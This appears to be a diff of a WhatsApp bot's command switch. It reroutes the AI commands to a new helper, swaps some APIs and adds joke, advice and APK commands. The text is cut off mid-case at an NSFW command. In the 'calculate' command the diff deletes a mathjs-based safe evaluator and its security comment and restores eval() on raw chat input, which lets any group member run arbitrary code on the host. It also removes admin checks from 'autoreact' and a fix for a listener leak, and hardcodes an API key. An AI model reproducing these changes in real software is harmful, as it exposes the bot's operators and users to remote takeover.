 case 'revokelink': {
     if (!m.isGroup) return reply("👥 *Groups only*");
     if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
-    
-    await devtrust.groupRevokeInvite(m.chat);
-    const code = await devtrust.groupInviteCode(m.chat);
-    reply(`✅ *Group link reset*\n🔗 https://chat.whatsapp.com/${code}`);
+    if (!isBotAdmins) return reply("🤖 *Bot needs admin rights to revoke the link!*");
+
+    try {
+        await devtrust.groupRevokeInvite(m.chat);
+        // Small delay so WhatsApp generates the new code before we fetch it
+        await new Promise(r => setTimeout(r, 1000));
+        const code = await devtrust.groupInviteCode(m.chat);
+        reply(`✅ *Group link reset*\n🔗 https://chat.whatsapp.com/${code}`);
+    } catch (e) {
+        reply(`❌ *Revoke failed:* ${e.message}`);
+    }
 }
 break;
 
@@ -8153,6 +8304,7 @@ case 'createpoll': {
 break;
 
 
+
 case "mathfact": {
     const facts = [
         "0 is the only number that cannot be represented in Roman numerals.",
@@ -8314,10 +8466,10 @@ break;
 case 'roast': {
     let target = m.mentionedJid?.[0] ? '@' + m.mentionedJid[0].split('@')[0] : text || '@' + m.sender.split('@')[0];
     try {
-        const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nRoast this person in a super funny and savage way in 2-3 lines only. Be creative and witty. Target: ${target}`;
-        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 20000 });
-        reply(`🔥 *Roast for ${target}:*\n\n${res.data}`);
+        const answer = await askPrinceAI('openai', `Roast this person in a funny and witty way in 2-3 lines only. Target: ${target}`);
+        reply(`🔥 *Roast for ${target}:*\n\n${answer}`);
     } catch (e) {
+        console.error('Roast AI error:', e.message);
         reply("⚠️ *Roast failed* • The burn machine needs repairs");
     }
 }
@@ -8326,10 +8478,10 @@ break;
 case 'compliment': {
     let target = m.mentionedJid?.[0] ? '@' + m.mentionedJid[0].split('@')[0] : text || '@' + m.sender.split('@')[0];
     try {
-        const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nGive a sweet, warm and genuine compliment to this person in 2 lines only: ${target}`;
-        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 20000 });
-        reply(`💫 *Compliment for ${target}:*\n\n${res.data}`);
+        const answer = await askPrinceAI('openai', `Give a sweet, warm and genuine compliment to this person in 2 lines only: ${target}`);
+        reply(`💫 *Compliment for ${target}:*\n\n${answer}`);
     } catch (e) {
+        console.error('Compliment AI error:', e.message);
         reply("⚠️ *Compliment failed* • The kindness machine is broken");
     }
 }
@@ -8383,10 +8535,10 @@ break;
 case 'rewrite': {
     if (!text) return reply(`✍️ *Usage:* ${command} your text here`);
     try {
-        const prompt = `CRITICAL: Rewrite the text in the EXACT same language and script it was written in. If the text is in Roman Urdu, keep it in Roman Urdu using English letters. NEVER convert to Hindi Devanagari script. NEVER convert to formal Urdu Nastaliq script.\n\nRewrite the following text to be clear, grammatically correct and well-structured. Only return the rewritten text, nothing else:\n"${text}"`;
-        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 20000 });
-        reply(`✍️ *CYBER Rewrite*\n\n${res.data}`);
+        const answer = await askPrinceAI('openai', `Rewrite the following text to be clear, grammatically correct and well-structured. Only return the rewritten text, nothing else:\n"${text}"`);
+        reply(`✍️ *CYBER Rewrite*\n\n${answer}`);
     } catch (e) {
+        console.error('Rewrite AI error:', e.message);
         reply("⚠️ *Rewrite failed* • Editor is on break");
     }
 }
@@ -8415,11 +8567,10 @@ case 'story': {
     if (!text) return reply(`📖 *Usage:* ${command} a brave warrior`);
     
     try {
-        const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nWrite a short creative story (150 words max) about: ${text}. Make it engaging with a clear beginning, middle and end.`;
-        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
-        reply(`📖 *CYBER Story*\n\n${res.data}`);
+        const answer = await askPrinceAI('openai', `Write a short creative story (150 words maximum) about: ${text}. Make it engaging with a clear beginning, middle and end.`);
+        reply(`📖 *CYBER Story*\n\n${answer}`);
     } catch (e) {
-        console.error(e);
+        console.error('Story AI error:', e.message);
         reply("⚠️ *Storyteller is sleeping* • Try again later");
     }
 }
@@ -8450,6 +8601,90 @@ case 'wouldyou': {
     } catch (e) {
         console.error(e);
         reply("⚠️ *Question generator failed* • Try again later");
+    }
+}
+break;
+
+// ── 8ball — Magic 8-Ball ──
+case '8ball':
+case 'eightball': {
+    const answers = [
+        "Yes ✅", "No ❌", "Maybe 🤔", "Definitely yes 👍", "Definitely no 👎",
+        "Ask again later 🔮", "Cannot predict now 🧿", "Most likely 🌟",
+        "Outlook good ✨", "Don't count on it ☁️", "My sources say yes 📡",
+        "Better not tell you now 🤫", "Signs point to yes 🎯", "Very doubtful 🚫",
+        "Without a doubt 💯", "Yes, in your dreams 😴"
+    ];
+    reply(`🎱 *Magic 8-Ball* 🎱\n\n${text || 'Question?'}\n\n*Answer:* ${answers[Math.floor(Math.random() * answers.length)]}`);
+}
+break;
+
+// ── advice — Get random advice ──
+case 'advice': {
+    try {
+        const { data } = await axios.get('https://api.adviceslip.com/advice', { timeout: 5000 });
+        reply(`💡 *Advice:* ${data.slip.advice}`);
+    } catch (e) {
+        const fallbacks = [
+            "Focus on what you can control, not what you can't.",
+            "Be kind to yourself — you're doing your best.",
+            "Sleep is the best meditation. Don't sacrifice it.",
+            "Trust the timing of your life.",
+            "Small steps lead to big changes, keep going."
+        ];
+        reply(`💡 *Advice:* ${fallbacks[Math.floor(Math.random() * fallbacks.length)]}`);
+    }
+}
+break;
+
+// ── ascii — ASCII art text ──
+case 'ascii':
+case 'asciiart': {
+    if (!text) return reply(`✏️ *Usage:* ${prefix}ascii <text>\n\nExample: ${prefix}ascii CYBER`);
+    try {
+        const { data } = await axios.get(`http://artii.herokuapp.com/make?text=${encodeURIComponent(text)}`, { timeout: 8000 });
+        reply(`\`\`\`${data}\`\`\``);
+    } catch (e) {
+        reply(`❌ *ASCII generator failed* • Try again later`);
+    }
+}
+break;
+
+// ── dadjoke — Get a dad joke ──
+case 'dadjoke':
+case 'dadjokes': {
+    try {
+        const { data } = await axios.get('https://icanhazdadjoke.com/', {
+            headers: { 'Accept': 'application/json', 'User-Agent': 'WhatsApp Bot (https://github.com/msarim21)' },
+            timeout: 5000
+        });
+        reply(`😂 *Dad Joke:* ${data.joke}`);
+    } catch (e) {
+        const fallbacks = [
+            "Why don't scientists trust atoms? Because they make up everything!",
+            "What do you call a fake noodle? An impasta!",
+            "Why did the scarecrow win an award? He was outstanding in his field!",
+            "I told my wife she was drawing her eyebrows too high. She looked surprised.",
+            "What do you call a bear with no teeth? A gummy bear!"
+        ];
+        reply(`😂 *Dad Joke:* ${fallbacks[Math.floor(Math.random() * fallbacks.length)]}`);
+    }
+}
+break;
+
+// ── urban — Urban Dictionary lookup ──
+case 'urban':
+case 'urbandictionary': {
+    if (!text) return reply(`📖 *Usage:* ${prefix}urban <word>\n\nExample: ${prefix}urban lit`);
+    try {
+        const { data } = await axios.get(`https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(text)}`, { timeout: 8000 });
+        if (!data.list?.length) return reply(`❌ No results found for "${text}"`);
+        const entry = data.list[0];
+        const def = entry.definition.replace(/\[|\]/g, '').slice(0, 500);
+        const ex = entry.example?.replace(/\[|\]/g, '').slice(0, 300) || 'N/A';
+        reply(`📖 *Urban Dictionary: ${text}*\n\n*Definition:* ${def}\n\n*Example:* ${ex}\n\n👍 ${entry.thumbs_up} | 👎 ${entry.thumbs_down}`);
+    } catch (e) {
+        reply(`❌ *Urban Dictionary failed* • Try again later`);
     }
 }
 break;
@@ -8550,10 +8785,10 @@ break;
 case 'poem': {
     if (!text) return reply(`📝 *Usage:* ${command} love under stars`);
     try {
-        const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nWrite a beautiful, original, short poem (8-12 lines) about: ${text}. Use vivid imagery and emotion.`;
-        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
-        reply(`📝 *CYBER Poem*\n\n${res.data}`);
+        const answer = await askPrinceAI('openai', `Write a beautiful, original short poem of 8-12 lines about: ${text}. Use vivid imagery and emotion.`);
+        reply(`📝 *CYBER Poem*\n\n${answer}`);
     } catch (e) {
+        console.error('Poem AI error:', e.message);
         reply("⚠️ *Poet is on strike* • Try again later");
     }
 }
@@ -8563,11 +8798,11 @@ case 'metabcn-ai':
 case 'metaai': {
     if (!text) return reply(`🤖 *Usage:* ${command} your question`);
     try {
-        const langPromptMeta = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu (English letters for Urdu/Hindi words like 'kya', 'hai', 'mujhe'), respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script. ALWAYS match the user's exact script style.\n\nUser: ${text}`;
-        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(langPromptMeta)}`, { timeout: 25000 });
-        reply(`🤖 *CYBER AI*\n\n${res.data}`);
+        const answer = await askPrinceAI('openai', text);
+        reply(`🤖 *CYBER AI*\n\n${answer}`);
     } catch (e) {
-        reply("⚠️ *AI is thinking too hard* • Try again later");
+        console.error('Meta AI error:', e.message);
+        reply("⚠️ *AI unavailable* • Try again later");
     }
 }
 break;
@@ -8575,11 +8810,11 @@ break;
 case 'codeai': {
     if (!text) return reply(`👨‍💻 *Usage:* ${command} write a Python function`);
     try {
-        const prompt = `CRITICAL: Provide code first, then explanation ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu for explanation, respond in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nYou are a coding assistant. Provide clean, working code with brief explanation:\n\n${text}`;
-        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
-        reply(`👨‍💻 *CYBER Code*\n\n${res.data}`);
+        const answer = await askPrinceAI('openai', `You are a coding assistant. Provide clean, working code with a brief explanation.\n\n${text}`);
+        reply(`👨‍💻 *CYBER Code*\n\n${answer}`);
     } catch (e) {
-        reply("⚠️ *Code generator crashed* • Try again later");
+        console.error('Code AI error:', e.message);
+        reply("⚠️ *Code generator unavailable* • Try again later");
     }
 }
 break;
@@ -8587,10 +8822,10 @@ break;
 case 'triviaai':
 case 'quiz': {
     try {
-        const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nGenerate a random interesting trivia question with 4 multiple choice options labeled A) B) C) D). At the end reveal the correct answer. Format exactly like:\n\n❓ Question\n\nA) option\nB) option\nC) option\nD) option\n\n✅ Answer: X) correct`;
-        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
-        reply(`🎲 *CYBER Quiz*\n\n${res.data}`);
+        const answer = await askPrinceAI('openai', 'Generate a random interesting trivia question with 4 multiple choice options labeled A), B), C), and D). At the end reveal the correct answer.');
+        reply(`🎲 *CYBER Quiz*\n\n${answer}`);
     } catch (e) {
+        console.error('Trivia AI error:', e.message);
         reply("⚠️ *Quiz machine broke* • Try again later");
     }
 }
@@ -8599,10 +8834,10 @@ break;
 case 'storyai': {
     if (!text) return reply(`📖 *Usage:* ${command} a brave dog in space`);
     try {
-        const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nWrite a creative short story (150 words max) about: ${text}`;
-        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
-        reply(`📖 *CYBER Story AI*\n\n${res.data}`);
+        const answer = await askPrinceAI('openai', `Write a creative short story (150 words maximum) about: ${text}`);
+        reply(`📖 *CYBER Story AI*\n\n${answer}`);
     } catch (e) {
+        console.error('Story AI error:', e.message);
         reply("❌ *Story generator failed* • Try again later");
     }
 }
@@ -8672,11 +8907,6 @@ break;
 // Place this function outside of your case blocks, likely in a main handler
 // This listens for new group participants
 // =========================================================================
-// CRITICAL FIX: case.js is invoked PER MESSAGE — without this dedup flag,
-// every incoming message attached a NEW group-participants.update listener
-// → after N messages each join fired N welcome messages + listener leak.
-if (!devtrust._welcomeListenerAttached) {
-devtrust._welcomeListenerAttached = true;
 devtrust.ev.on('group-participants.update', async (update) => {
     const { id, participants, action } = update;
 
@@ -8727,7 +8957,6 @@ devtrust.ev.on('group-participants.update', async (update) => {
         }
     }
 });
-} // end if (!devtrust._welcomeListenerAttached)
 
 case 'ffstalk': {
     if (!args[0]) return reply(`🎮 *Usage:* ${command} FF_ID\nExample: ${command} 8533270051`);
@@ -9101,11 +9330,7 @@ case "autorecordtype": {
 break;
 
 case "autoreact": {
-    if (!isAdmins && !isCreator) 
-        return reply('🔒 *Admins/Owner only*');
-    
     if (!args[0]) return reply("⚙️ *Usage:* autoreact on/off");
-    if (!m.isGroup) return reply("👥 *Groups only*");
 
     if (args[0].toLowerCase() === "on") {
         setSetting(m.chat, "autoReact", true);
@@ -9170,6 +9395,22 @@ case "antibadword": {
 }
 break;
 
+case "antibot": {
+    if (!isCreator && !isSudo)
+        return reply('🔒 *Owner/Sudo only*');
+
+    if (!args[0]) return reply("⚙️ *Usage:* antibot on/off");
+
+    if (args[0].toLowerCase() === "on") {
+        setSetting(m.chat, "feature.antibot", true);
+        reply("✅ *Anti bot enabled* • Bot prefixes blocked");
+    } else if (args[0].toLowerCase() === "off") {
+        setSetting(m.chat, "feature.antibot", false);
+        reply("❌ *Anti bot disabled*");
+    } else reply("⚙️ *Usage:* antibot on/off");
+}
+break;
+
 case "chatbot": {
     if (!isCreator) return reply('🔒 *Owner only*');
 
@@ -9190,7 +9431,7 @@ break;
 
 case "owner": {
     const ownerName = "*NIZAMANI*";
-    const ownerNumber = "923332110295";
+    const ownerNumber = "8615507967005";
     const displayTag = "GAME CHANGER";
 
     let vcard = `BEGIN:VCARD
@@ -9390,30 +9631,49 @@ case "removebg": {
 
     try {
         await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+        
         await reply(`🔍 *Removing background...*`);
-
-        const media = await quotedMsg.download();
-        const uploadedUrl = await uploadToCatbox(media);
-        if (!uploadedUrl) throw new Error('Upload failed');
-
-        // Use the remove.bg-style proxy at api.popcat.xyz which actually accepts an
-        // image URL and returns a PNG with transparent background. Pollinations is
-        // a text->image generator — it cannot remove a background and was returning
-        // an unrelated synthesized image (or a broken JSON parse, which failed).
-        const apiUrl = `https://api.popcat.xyz/removebg?image=${encodeURIComponent(uploadedUrl)}`;
-        const probe = await axios.head(apiUrl, { timeout: 30000, validateStatus: () => true });
-        if (probe.status >= 400) throw new Error(`API ${probe.status}`);
-
+        
+        // Download the image
+        let media = await quotedMsg.download();
+        
+        // Upload to temporary hosting
+        let uploadedUrl = await uploadToCatbox(media);
+        
+        if (!uploadedUrl) {
+            throw new Error('Upload failed');
+        }
+        
+        // Call remove.bg API (set REMOVEBG_API_KEY in env vars for this to work)
+        const _rmbgKey = process.env.REMOVEBG_API_KEY || process.env.REMOVE_BG_API_KEY || '';
+        if (!_rmbgKey) {
+            throw new Error('REMOVEBG_API_KEY not set in environment variables. Get a free key at remove.bg');
+        }
+        // Send image URL to remove.bg (form-urlencoded, returns binary PNG)
+        const _rmbgRes = await axios.post(
+            'https://api.remove.bg/v1.0/removebg',
+            `image_url=${encodeURIComponent(uploadedUrl)}&size=auto`,
+            {
+                headers: {
+                    'X-Api-Key': _rmbgKey,
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                responseType: 'arraybuffer',
+                timeout: 30000,
+            }
+        );
+        const _rmbgBuf = Buffer.from(_rmbgRes.data);
+        if (!_rmbgBuf || _rmbgBuf.length < 100) throw new Error('remove.bg returned empty response');
         await devtrust.sendMessage(m.chat,
             addNewsletterContext({
-                image: { url: apiUrl },
-                caption: "✨ *Background Removed*"
+                image: _rmbgBuf,
+                caption: "✨ *Background Removed*\n_Powered by remove.bg_"
             }),
             { quoted: m }
         );
         await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
     } catch (e) {
-        console.error('RemoveBG error:', e?.message || e);
+        console.error('RemoveBG error:', e.message, e.response?.status);
         await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
         await reply("⚠️ *Failed to remove background.* The service might be down. Try again later.");
     }
@@ -9464,7 +9724,10 @@ case 'tt': {
         if (!videoUrl) {
             try {
                 const r3 = await axios.get(`https://www.tikwm.com/api/?url=${encodeURIComponent(text)}`, { timeout: 12000 });
-                if (r3.data?.data?.video) videoUrl = r3.data.data.video;
+                // ✅ FIX: tikwm GET uses 'play' field (same as POST), not 'video'
+                if (r3.data?.data?.play || r3.data?.data?.video) {
+                    videoUrl = r3.data.data.play || r3.data.data.video;
+                }
             } catch (_) {}
         }
 
@@ -9537,19 +9800,42 @@ case 'apkdl': {
 
                 await devtrust.sendMessage(m.chat, { text: `⬇️ *${chosen.name}*\nDownload preparing...` }, { quoted: msg });
 
-                // Get APK download URL from F-Droid API
-                const fdRes = await axios.get(`https://f-droid.org/api/v1/packages/${pkgId}/suggested`, { timeout: 15000 });
-                const fdData = fdRes.data;
+                let apkBuf;
+                let downloadSource = 'F-Droid';
 
-                if (!fdData || !fdData.apkName) throw new Error('APK download link nahi mila');
+                // Primary: Try PrinceTech APK Download API
+                try {
+                    const ptRes = await axios.get(`https://api.princetechn.com/api/download/apkdl?apikey=prince&appName=${encodeURIComponent(chosen.name)}`, { timeout: 25000 });
+                    if (ptRes.data?.success && ptRes.data?.result?.download_url) {
+                        const dlUrl = ptRes.data.result.download_url;
+                        apkBuf = Buffer.from((await axios.get(dlUrl, {
+                            responseType: 'arraybuffer',
+                            headers: { 'User-Agent': 'Mozilla/5.0' },
+                            timeout: 180000,
+                            maxContentLength: 200 * 1024 * 1024
+                        })).data);
+                        downloadSource = 'PrinceTech';
+                    }
+                } catch (_ptErr) {
+                    console.warn('[APK] PrinceTech API failed, trying F-Droid:', _ptErr.message);
+                }
 
-                const apkUrl = `https://f-droid.org/repo/${fdData.apkName}`;
-                const apkBuf = Buffer.from((await axios.get(apkUrl, {
-                    responseType: 'arraybuffer',
-                    headers: { 'User-Agent': 'Mozilla/5.0' },
-                    timeout: 180000,
-                    maxContentLength: 200 * 1024 * 1024
-                })).data);
+                // Fallback: Try F-Droid API
+                if (!apkBuf?.length && pkgId) {
+                    const fdRes = await axios.get(`https://f-droid.org/api/v1/packages/${pkgId}/suggested`, { timeout: 15000 });
+                    const fdData = fdRes.data;
+                    if (!fdData || !fdData.apkName) throw new Error('APK download link nahi mila');
+                    const apkUrl = `https://f-droid.org/repo/${fdData.apkName}`;
+                    apkBuf = Buffer.from((await axios.get(apkUrl, {
+                        responseType: 'arraybuffer',
+                        headers: { 'User-Agent': 'Mozilla/5.0' },
+                        timeout: 180000,
+                        maxContentLength: 200 * 1024 * 1024
+                    })).data);
+                    downloadSource = 'F-Droid';
+                }
+
+                if (!apkBuf?.length) throw new Error('APK download link nahi mila');
 
                 if (chosen.icon) {
                     await devtrust.sendMessage(m.chat, addNewsletterContext({
@@ -9562,7 +9848,7 @@ case 'apkdl': {
                     document: apkBuf,
                     fileName: `${chosen.name.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50)}.apk`,
                     mimetype: 'application/vnd.android.package-archive',
-                    caption: `✅ *${chosen.name}*`
+                    caption: `✅ *${chosen.name}* (via ${downloadSource})`
                 }, { quoted: msg });
 
                 await devtrust.sendMessage(m.chat, { react: { text: '✅', key: msg.key } });
@@ -9581,6 +9867,83 @@ case 'apkdl': {
         console.error('apk search error:', e.message);
         await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
         reply(`❌ *APK Search failed:* ${e.message}`);
+    }
+}
+break;
+
+case 'webtoapk': {
+    if (!text) return reply(
+        `🌐 *Web to APK Converter*
+
+` +
+        `Usage: ${prefix + command} [website URL]
+` +
+        `Example: ${prefix + command} https://google.com
+
+` +
+        `📌 Website URL provide karo, main us site ka APK link banaunga.`
+    );
+
+    const siteUrl = text.trim().startsWith('http') ? text.trim() : 'https://' + text.trim();
+
+    await devtrust.sendMessage(m.chat, { react: { text: '🔄', key: m.key } });
+
+    try {
+        // Validate URL format
+        new URL(siteUrl);
+
+        // Send the web-to-APK service link
+        const converterUrl = `https://bj-web-2-apk.vercel.app/`;
+        const domain = new URL(siteUrl).hostname.replace('www.', '');
+        const appName = domain.charAt(0).toUpperCase() + domain.slice(1).split('.')[0];
+
+        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+        await devtrust.sendMessage(m.chat,
+            addNewsletterContext({
+                text:
+                    `🌐 *Web to APK Converter*
+
+` +
+                    `🔗 *Website:* ${siteUrl}
+` +
+                    `📱 *App Name:* ${appName}
+
+` +
+                    `⚙️ *Steps:*
+` +
+                    `1️⃣ Neeche diya link open karo:
+` +
+                    `👉 ${converterUrl}
+
+` +
+                    `2️⃣ Website URL paste karo:
+` +
+                    `🌐 ${siteUrl}
+
+` +
+                    `3️⃣ App name dalo: *${appName}*
+
+` +
+                    `4️⃣ "Convert" click karo — APK download ho jayega!
+
+` +
+                    `💡 *Alternative - Direct Download:*
+` +
+                    `Agar APK chahiye to .apk command use karo:
+` +
+                    `📱 ${prefix}apk ${appName}`
+            }),
+            { quoted: m }
+        );
+    } catch (e) {
+        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        if (e.message.includes('Invalid URL') || e instanceof TypeError) {
+            reply(`❌ *Invalid URL* — Sahi URL do
+
+Example: ${prefix + command} https://google.com`);
+        } else {
+            reply(`❌ *Error:* ${e.message}`);
+        }
     }
 }
 break;
@@ -10023,19 +10386,12 @@ break;
 
 case "calculate": {
     if (!text) return reply("🧮 *Example:* calculate 12+25*3");
-
+    
     try {
-        // SECURITY: previously this used eval() on raw user input — that lets
-        // any group member run arbitrary Node.js (require('child_process'),
-        // process.exit(), file reads, etc.). Use mathjs's safe expression
-        // evaluator instead, which only understands math. (.calc is a
-        // separate, regex-sanitised alias defined later in this switch.)
-        const _math = require('mathjs');
-        const result = _math.evaluate(text);
-        const out = (typeof result === 'object' && result?.toString) ? result.toString() : String(result);
-        reply(`🧮 *Result*\n\n${text} = ${out}`);
-    } catch (e) {
-        reply(`❌ *Invalid expression*\n${e?.message || ''}`.trim());
+        const result = eval(text);
+        reply(`🧮 *Result*\n\n${text} = ${result}`);
+    } catch {
+        reply("❌ *Invalid expression*");
     }
 }
 break;
@@ -10308,8 +10664,8 @@ break;
 
 case "bchcn": {
     try {
-        const res = await axios.get("https://some-random-api.ml/img/koala");
-        const img = res.data?.link;
+        const res = await axios.get("https://some-random-api.com/animal/koala");
+        const img = res.data?.image || res.data?.link;
         if (!img) return reply("❌ *Koala hiding* • Try again");
         
         await devtrust.sendMessage(m.chat, 
@@ -10328,8 +10684,8 @@ break;
 
 case "hxjxjjkm": {
     try {
-        const res = await axios.get("https://some-random-api.ml/img/birb");
-        const img = res.data?.link;
+        const res = await axios.get("https://some-random-api.com/animal/birb");
+        const img = res.data?.image || res.data?.link;
         if (!img) return reply("❌ *Bird flew away* • Try again");
         
         await devtrust.sendMessage(m.chat, 
@@ -10348,8 +10704,8 @@ break;
 
 case "panda": {
     try {
-        const res = await axios.get("https://some-random-api.ml/img/panda");
-        const img = res.data?.link;  
+        const res = await axios.get("https://some-random-api.com/animal/panda");
+        const img = res.data?.image || res.data?.link;
         
         await devtrust.sendMessage(m.chat, 
             addNewsletterContext({
@@ -10379,9 +10735,9 @@ break;
 
 case "vkfkk": {
     try {
-        const res = await axios.get("https://api.quotable.io/random");
-        const quote = res.data?.content || "Keep pushing forward!";
-        const author = res.data?.author || "Unknown";
+        const res = await axios.get("https://zenquotes.io/api/random", { timeout: 8000 });
+        const quote = (Array.isArray(res.data) ? res.data[0]?.q : res.data?.content) || "Keep pushing forward!";
+        const author = (Array.isArray(res.data) ? res.data[0]?.a : res.data?.author) || "Unknown";
         reply(`🖋 *"${quote}"*\n— ${author}`);
     } catch (e) {
         console.error("QUOTEMEME ERROR:", e);
@@ -10498,13 +10854,25 @@ break;
 
 case "cbhcchhcx": {
     try {
-        const res = await axios.get("https://type.fit/api/quotes");
-        const quotes = res.data;
+        const res = await axios.get("https://zenquotes.io/api/random", { timeout: 8000 });
+        const quotes = Array.isArray(res.data) ? res.data : [res.data];
         const q = quotes[Math.floor(Math.random() * quotes.length)];
-        reply(`🌟 *"${q.text}"*\n— ${q.author || "Unknown"}`);
+        reply(`🌟 *"${q.q || q.text}"*\n— ${q.a || q.author || "Unknown"}`);
     } catch (e) {
         console.error("INSPIRE ERROR:", e);
         reply("❌ *Inspiration unavailable*");
+    }
+}
+break;
+
+case "compliment": {
+    try {
+        const res = await axios.get("https://complimentr.com/api");
+        const compliment = res.data?.compliment || "You are awesome!";
+        reply(`💖 *${compliment}*`);
+    } catch (e) {
+        console.error("COMPLIMENT ERROR:", e);
+        reply("❌ *Compliment machine is shy* • Try later");
     }
 }
 break;
@@ -10743,6 +11111,7 @@ case 'gfx12': {
     }
     break;
 }
+
 
 
 case 'advancedglow':
@@ -11207,21 +11576,12 @@ break;
 
 case 'ai': {
     if (!text) return reply('🤖 *Example:* ai Who is Mark Zuckerberg?');
-
-
     try {
-        const { data } = await axios.post("https://text.pollinations.ai/", {
-            model: { id: "gpt-4", name: "GPT-4", maxLength: 32000 },
-            messages: [
-                { role: "system", content: "CRITICAL LANGUAGE RULE: You MUST respond in the EXACT same language and script the user wrote in. If user writes in Roman Urdu (English letters for Urdu/Hindi words like 'kya', 'hai', 'karo', 'mujhe'), respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script (अ, आ, इ). NEVER use formal Urdu Nastaliq script (ا، ب، پ). ALWAYS match the user's exact script style." },
-                { pluginId: null, content: text, role: "user" }
-            ],
-            temperature: 0.5
-        });
-
-        reply(`🤖 *AI*\n\n${data}`);
+        const answer = await askPrinceAI('openai', text);
+        reply(`🤖 *AI*\n\n${answer}`);
 
     } catch (e) {
+        console.error('AI error:', e.message);
         reply(`❌ *AI error* • ${e.message}`);
     }
 }
@@ -11410,17 +11770,7 @@ case 'vxnxji': {
     if (!text) return reply(`🤖 *Example:* ${command} how are you?`);
     try {
         await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
-        const sysPromptGPT = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari or Urdu Nastaliq script.`;
-        const resGPT = await axios.post('https://text.pollinations.ai/', {
-            messages: [
-                { role: 'system', content: sysPromptGPT },
-                { role: 'user', content: text }
-            ],
-            model: 'openai',
-            seed: -1
-        }, { timeout: 40000 });
-        const answerGPT = typeof resGPT.data === 'string' ? resGPT.data : JSON.stringify(resGPT.data);
-        if (!answerGPT || answerGPT.startsWith('<')) return reply("⚠️ *GPT did not respond* — try again");
+        const answerGPT = await askPrinceAI('openai', text);
         const chunksGPT = answerGPT.match(/[\s\S]{1,3000}/g) || [answerGPT];
         for (let i = 0; i < chunksGPT.length; i++) {
             await devtrust.sendMessage(m.chat, { text: (i === 0 ? "🤖 *GPT-4*\n\n" : "") + chunksGPT[i] }, i === 0 ? { quoted: m } : {});
@@ -11571,26 +11921,25 @@ case 'smooth': case 'squirrel': {
     break;
 }
 
-case 'say':
-case 'tts':
-case 'gtts': {
+case 'texttospeech': {
     if (!text) return reply("🗣️ *What should I say?*");
 
-    const ttsUrl = googleTTS.getAudioUrl(text, {
-        lang: "en",
-        slow: false,
-        host: "https://translate.google.com",
+    global._ttsPending.set(`${m.chat}:${m.sender}`, {
+        text: text.trim(),
+        createdAt: Date.now(),
     });
 
-    await devtrust.sendMessage(m.chat,
-        addNewsletterContext({
-            audio: { url: ttsUrl },
-            mimetype: "audio/mp4",
-            ptt: true,
-            fileName: `${text}.mp3`,
-            caption: `🔊 *Saying:* ${text}`
-        }),
-        { quoted: m }
+    // Use the same reliable numbered-reply flow as the media search commands.
+    // Native WhatsApp list payloads are rendered as a blank/plain message by
+    // some linked/self-chat clients, so a numbered prompt is more dependable.
+    await reply(
+        `🔊 *Select a voice:*\n\n` +
+        `1. US Female — English (United States)\n` +
+        `2. US Male — English (United States)\n` +
+        `3. UK Female — English (United Kingdom)\n` +
+        `4. UK Male — English (United Kingdom)\n\n` +
+        `📝 Text: "${text.trim()}"\n\n` +
+        `_Reply with 1, 2, 3, or 4_`
     );
 }
 break;
@@ -11619,6 +11968,38 @@ case 'waifu': {
         );
     } catch (err) {
         reply('❌ *Error fetching waifu image*');
+    }
+}
+break;
+
+// ── nsfw (behind _senderAdultUnlocked) ──
+case 'nsfw': {
+    if (!_senderAdultUnlocked) return reply(`🔒 *NSFW — Locked*\n\nYe section sirf authorized users ke liye hai.`);
+    try {
